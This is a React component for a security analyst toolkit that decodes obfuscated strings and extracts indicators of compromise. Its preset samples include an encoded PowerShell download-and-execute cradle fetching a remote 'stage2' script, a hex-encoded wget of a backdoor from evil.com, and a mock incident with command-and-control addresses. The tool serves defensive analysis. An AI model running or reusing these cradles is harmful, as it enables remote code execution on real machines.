import React, { useState } from 'react';
import { 
  FileCode2, 
  Terminal, 
  Copy, 
  Check, 
  ArrowRight, 
  Hash, 
  ShieldAlert, 
  Sparkles, 
  KeyRound 
} from 'lucide-react';
import { api } from '../services/api';

export function CyberChefTab() {
  const [activeSubTab, setActiveSubTab] = useState('decoder'); // 'decoder' | 'ioc_extractor'

  // CyberChef states
  const [operation, setOperation] = useState('base64_decode');
  const [inputText, setInputText] = useState('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==');
  const [param, setParam] = useState('');
  const [outputText, setOutputText] = useState('');
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);

  // IOC Extractor states
  const [rawText, setRawText] = useState(`Incident Alert: Attacker from 194.26.29.112 executed ransomware binary wcry.exe
SHA256: 24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c
C2 Beacon callback to http://185.220.101.5/beacon.php and domain malicious-c2-update.org
Targeting vulnerability CVE-2021-44228 via contact admin@target-corp.com`);
  const [extractedIOCs, setExtractedIOCs] = useState(null);
  const [extracting, setExtracting] = useState(false);

  const handleExecuteOperation = async () => {
    if (!inputText) return;
    setLoading(true);
    try {
      const res = await api.executeCyberChef(operation, inputText, param);
      setOutputText(res.output_text || '');
    } catch (err) {
      setOutputText('ERROR: ' + err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleExtractIOCs = async () => {
    if (!rawText) return;
    setExtracting(true);
    try {
      const res = await api.extractIOCs(rawText);
      setExtractedIOCs(res);
    } catch (err) {
      alert('IOC extraction error: ' + err.message);
    } finally {
      setExtracting(false);
    }
  };

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const samplePayloads = [
    { label: 'PowerShell Base64', op: 'base64_decode', text: 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==' },
    { label: 'Standard Base64', op: 'base64_decode', text: 'SGVsbG8gU2VudGluZWxTT0MgQW5hbHlzdCEgVGhyZWF0IERldGVjdGVkLg==' },
    { label: 'Defang Malicious URL', op: 'defang', text: 'http://185.220.101.5/malware.exe' },
    { label: 'Hex Encoded Command', op: 'hex_decode', text: '7767657420687474703a2f2f6576696c2e636f6d2f6261636b646f6f72' },
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
      {/* Header & Subtabs */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '12px' }}>
        <div>
          <h2 style={{ fontSize: '18px', color: '#fff', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <FileCode2 size={20} color="var(--color-cyan)" />
            CYBERCHEF SECURITY ANALYST TOOLKIT
          </h2>
          <div style={{ fontSize: '12px', color: 'var(--text-muted)' }}>
            De-obfuscate Base64 malware payloads, decode hex, calculate cryptographic hashes, defang IOCs, and extract regex entities.
          </div>
        </div>

        <div style={{ display: 'flex', gap: '8px', background: 'rgba(13, 20, 36, 0.6)', padding: '4px', borderRadius: '8px', border: '1px solid var(--border-subtle)' }}>
          <button 
            className={`btn btn-sm ${activeSubTab === 'decoder' ? 'btn-primary' : 'btn-secondary'}`}
            onClick={() => setActiveSubTab('decoder')}
          >
            Payload De-obfuscator
          </button>
          <button 
            className={`btn btn-sm ${activeSubTab === 'ioc_extractor' ? 'btn-primary' : 'btn-secondary'}`}
            onClick={() => { setActiveSubTab('ioc_extractor'); if (!extractedIOCs) handleExtractIOCs(); }}
          >
            Regex IOC Extractor
          </button>
        </div>
      </div>

      {activeSubTab === 'decoder' ? (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
          
          {/* Operations Bar */}
          <div className="cyber-card" style={{ padding: '16px 20px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '14px', flexWrap: 'wrap' }}>
              <div style={{ width: '220px' }}>
                <label style={{ fontSize: '11px', color: 'var(--text-muted)', display: 'block', marginBottom: '4px' }}>OPERATION</label>
                <select 
                  className="form-select"
                  value={operation}
                  onChange={(e) => setOperation(e.target.value)}
                >
                  <optgroup label="Decoders">
                    <option value="base64_decode">Base64 Decode (UTF8 / UTF-16LE)</option>
                    <option value="hex_decode">Hex to Plaintext</option>
                    <option value="url_decode">URL Decode</option>
                    <option value="rot13">ROT13 Cipher</option>
                    <option value="refang">Refang URL / IP</option>
                  </optgroup>
                  <optgroup label="Encoders & Sanitization">
                    <option value="base64_encode">Base64 Encode</option>
                    <option value="hex_encode">Plaintext to Hex</option>
                    <option value="url_encode">URL Encode</option>
                    <option value="defang">Defang URL / IP (Safe sharing)</option>
                  </optgroup>
                  <optgroup label="Ciphers & Hashes">
                    <option value="xor">XOR with Key</option>
                    <option value="md5">MD5 Hash</option>
                    <option value="sha1">SHA1 Hash</option>
                    <option value="sha256">SHA256 Hash</option>
                  </optgroup>
                </select>
              </div>

              {operation === 'xor' && (
                <div style={{ width: '180px' }}>
                  <label style={{ fontSize: '11px', color: 'var(--text-muted)', display: 'block', marginBottom: '4px' }}>XOR KEY</label>
                  <input 
                    type="text" 
                    className="form-input" 
                    placeholder="Enter XOR key..."
                    value={param}
                    onChange={(e) => setParam(e.target.value)}
                  />
                </div>
              )}

              <div style={{ alignSelf: 'flex-end', marginLeft: 'auto' }}>
                <button 
                  className="btn btn-primary"
                  onClick={handleExecuteOperation}
                  disabled={loading}
                >
                  <Sparkles size={15} /> Execute Recipe
                </button>
              </div>
            </div>

            {/* Quick Sample Presets */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap', marginTop: '14px', paddingTop: '12px', borderTop: '1px solid rgba(45, 65, 105, 0.2)' }}>
              <span style={{ fontSize: '11px', color: 'var(--text-muted)', fontWeight: '600' }}>PRESETS:</span>
              {samplePayloads.map((preset, idx) => (
                <button 
                  key={idx}
                  className="btn btn-secondary btn-sm"
                  style={{ fontSize: '11px', padding: '3px 8px' }}
                  onClick={() => {
                    setOperation(preset.op);
                    setInputText(preset.text);
                  }}
                >
                  {preset.label}
                </button>
              ))}
            </div>
          </div>

          {/* Dual Panel: Input and Output */}
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
            
            {/* Input Panel */}
            <div className="cyber-card">
              <div className="card-header">
                <div className="card-title">
                  <Terminal size={16} color="var(--color-cyan)" />
                  <span>INPUT PAYLOAD / STRING</span>
                </div>
              </div>
              <textarea 
                className="form-textarea" 
                rows={10}
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                placeholder="Paste encoded string or payload here..."
                style={{ width: '100%', height: '220px' }}
              />
            </div>

            {/* Output Panel */}
            <div className="cyber-card">
              <div className="card-header">
                <div className="card-title">
                  <Check size={16} color="var(--color-success)" />
                  <span>RECIPE OUTPUT</span>
                </div>
                {outputText && (
                  <button 
                    className="btn btn-secondary btn-sm"
                    onClick={() => handleCopy(outputText)}
                  >
                    <Copy size={12} /> {copied ? 'Copied!' : 'Copy'}
                  </button>
                )}
              </div>
              <textarea 
                className="form-textarea" 
                rows={10}
                value={outputText}
                readOnly
                placeholder="Transformed output will appear here..."
                style={{ width: '100%', height: '220px', color: 'var(--color-cyan)' }}
              />
            </div>

          </div>

        </div>
      ) : (
        /* IOC Regex Extractor View */
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
          <div className="cyber-card">
            <div className="card-header">
              <div className="card-title">
                <Terminal size={16} color="var(--color-cyan)" />
                <span>UNSTRUCTURED THREAT INTEL / LOG DUMP</span>
              </div>
              <button 
                className="btn btn-primary btn-sm"
                onClick={handleExtractIOCs}
                disabled={extracting}
              >
                <Sparkles size={14} /> {extracting ? 'Extracting...' : 'Scan & Extract IOCs'}
              </button>
            </div>
            <textarea 
              className="form-textarea"
              rows={6}
              value={rawText}
              onChange={(e) => setRawText(e.target.value)}
              placeholder="Paste unstructured raw security report or logs..."
            />
          </div>

          {extractedIOCs && (
            <div className="cyber-card">
              <div className="card-header">
                <div className="card-title">
                  <ShieldAlert size={18} color="var(--color-high)" />
                  <span>EXTRACTED INDICATORS OF COMPROMISE ({extractedIOCs.total_found} Found)</span>
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
                
                {/* IPv4s */}
                <div style={{ background: '#0a0e17', padding: '14px', borderRadius: '6px', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ fontSize: '12px', fontWeight: '700', color: 'var(--color-cyan)', marginBottom: '8px' }}>
                    IPv4 ADDRESSES ({extractedIOCs.ipv4_addresses?.length || 0})
                  </div>
                  {extractedIOCs.ipv4_addresses?.map((ip, i) => (
                    <div key={i} className="mono" style={{ fontSize: '12.5px', color: '#fff', padding: '3px 0' }}>• {ip}</div>
                  ))}
                </div>

                {/* Hashes */}
                <div style={{ background: '#0a0e17', padding: '14px', borderRadius: '6px', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ fontSize: '12px', fontWeight: '700', color: 'var(--color-critical)', marginBottom: '8px' }}>
                    SHA256 & MD5 HASHES ({extractedIOCs.sha256_hashes?.length + extractedIOCs.md5_hashes?.length || 0})
                  </div>
                  {extractedIOCs.sha256_hashes?.map((h, i) => (
                    <div key={i} className="mono" style={{ fontSize: '11px', color: '#fff', wordBreak: 'break-all', padding: '3px 0' }}>• {h}</div>
                  ))}
                  {extractedIOCs.md5_hashes?.map((h, i) => (
                    <div key={i} className="mono" style={{ fontSize: '11px', color: '#fff', wordBreak: 'break-all', padding: '3px 0' }}>• {h}</div>
                  ))}
                </div>

                {/* URLs & Domains */}
                <div style={{ background: '#0a0e17', padding: '14px', borderRadius: '6px', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ fontSize: '12px', fontWeight: '700', color: 'var(--color-high)', marginBottom: '8px' }}>
                    URLs & DOMAINS ({extractedIOCs.urls?.length + extractedIOCs.domains?.length || 0})
                  </div>
                  {extractedIOCs.urls?.map((u, i) => (
                    <div key={i} className="mono" style={{ fontSize: '12px', color: '#fff', wordBreak: 'break-all', padding: '3px 0' }}>• {u}</div>
                  ))}
                  {extractedIOCs.domains?.map((d, i) => (
                    <div key={i} className="mono" style={{ fontSize: '12px', color: '#fff', padding: '3px 0' }}>• {d}</div>
                  ))}
                </div>

                {/* CVEs & Emails */}
                <div style={{ background: '#0a0e17', padding: '14px', borderRadius: '6px', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ fontSize: '12px', fontWeight: '700', color: 'var(--color-purple)', marginBottom: '8px' }}>
                    CVEs & IDENTITIES ({extractedIOCs.cve_ids?.length + extractedIOCs.email_addresses?.length || 0})
                  </div>
                  {extractedIOCs.cve_ids?.map((c, i) => (
                    <div key={i} className="mono" style={{ fontSize: '12.5px', color: '#fff', padding: '3px 0' }}>• {c}</div>
                  ))}
                  {extractedIOCs.email_addresses?.map((e, i) => (
                    <div key={i} className="mono" style={{ fontSize: '12px', color: '#fff', padding: '3px 0' }}>• {e}</div>
                  ))}
                </div>

              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
